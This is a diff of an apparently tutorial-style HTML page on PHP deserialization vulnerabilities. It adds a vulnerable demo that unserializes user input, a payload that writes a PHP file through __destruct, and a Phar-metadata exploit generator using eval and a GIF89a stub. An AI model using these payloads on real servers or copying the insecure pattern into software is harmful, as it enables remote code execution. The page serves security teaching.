@@ -379,17 +379,23 @@
     Session反序列化漏洞
   </a>
   
+    <nav class="md-nav" aria-label="Session反序列化漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session_1" class="md-nav__link">
+    Session序列化机制
+  </a>
+  
 </li>
         
       </ul>
     </nav>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    反序列化漏洞检测方法
-  </a>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -579,17 +585,23 @@
     Session反序列化漏洞
   </a>
   
+    <nav class="md-nav" aria-label="Session反序列化漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session_1" class="md-nav__link">
+    Session序列化机制
+  </a>
+  
 </li>
         
       </ul>
     </nav>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    反序列化漏洞检测方法
-  </a>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -628,10 +640,12 @@
 </li>
 <li><a href="#_4">反序列化漏洞常见类型</a><ul>
 <li><a href="#phar">Phar反序列化漏洞</a></li>
-<li><a href="#session">Session反序列化漏洞</a></li>
+<li><a href="#session">Session反序列化漏洞</a><ul>
+<li><a href="#session_1">Session序列化机制</a></li>
 </ul>
 </li>
-<li><a href="#_5">反序列化漏洞检测方法</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -836,12 +850,56 @@ payload:
 <img alt="" src="../../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" /></p>
 <h4 id="demo2">Demo2<a class="headerlink" href="#demo2" title="Permanent link">&para;</a></h4>
 <p>漏洞代码
-<div class="highlight"><pre><span></span><code>
-</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">foo</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;config.txt&quot;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</code></pre></div>
+payload:
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">foo</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot;&lt;?php phpinfo();?&gt;&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">foo</span><span class="p">());</span>
+</code></pre></div>
+生成flag.php文件</p>
 <h2 id="_4">反序列化漏洞常见类型<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 <h3 id="phar">Phar反序列化漏洞<a class="headerlink" href="#phar" title="Permanent link">&para;</a></h3>
+<p>漏洞成因：phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化</p>
+<p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
+<p><a href="https://xz.aliyun.com/t/3692">https://xz.aliyun.com/t/3692</a>  </p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">AnyClass</span><span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;echo &quot;ok&quot;;&#39;</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">output</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;phar.phar&#39;</span><span class="p">);</span>
+<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">stopBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class="p">);</span>
+<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span><span class="s1">&#39;test&#39;</span><span class="p">);</span>
+
+
+<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AnyClass</span><span class="p">();</span>
+<span class="nv">$object</span> <span class="o">-&gt;</span> <span class="na">output</span><span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+
+
+<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">setMetadata</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
+<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">stopBuffering</span><span class="p">();</span>
+</code></pre></div>
+
 <h3 id="session">Session反序列化漏洞<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
-<h2 id="_5">反序列化漏洞检测方法<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h4 id="session_1">Session序列化机制<a class="headerlink" href="#session_1" title="Permanent link">&para;</a></h4>
+<p><a href="https://blog.csdn.net/nzjdsds/article/details/82703639">https://blog.csdn.net/nzjdsds/article/details/82703639</a></p>
                 
               
               
